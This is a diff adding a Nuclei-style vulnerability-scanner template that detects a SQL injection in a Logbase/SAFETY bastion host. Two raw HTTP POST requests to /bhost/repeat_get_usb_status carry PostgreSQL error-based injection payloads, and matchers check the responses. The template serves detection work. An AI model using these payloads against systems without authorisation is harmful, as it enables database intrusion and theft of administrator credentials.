@@ -1,0 +1,49 @@
+id: logbase-bastionhost-sql-injection
+info:
+  name: Logbase Bastionhost SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SAFETY's bastion host system before 2021 has a SQL injection vulnerability. An attacker can exploit this to obtain administrator credentials and gain access to more internal host permissions.
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /bhost/repeat_get_usb_status HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+        Referer: https://{{BaseURL}}/bhost/
+
+        z1=1' or 7778=CAST((SELECT version())::text AS NUMERIC) --
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "PostgreSQL( +)[0-9]+(\\.[0-9]+)+"
+  - raw:
+      - |
+        POST /bhost/repeat_get_usb_status HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+        Referer: https://{{BaseURL}}/bhost/
+
+        z1=1' AND 5564=CAST((CHR(113)||CHR(113)||CHR(106)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5564=5564) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(107)||CHR(113)) AS NUMERIC) AND 'nhda'='nhda
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "qqjkq1qkxkq"
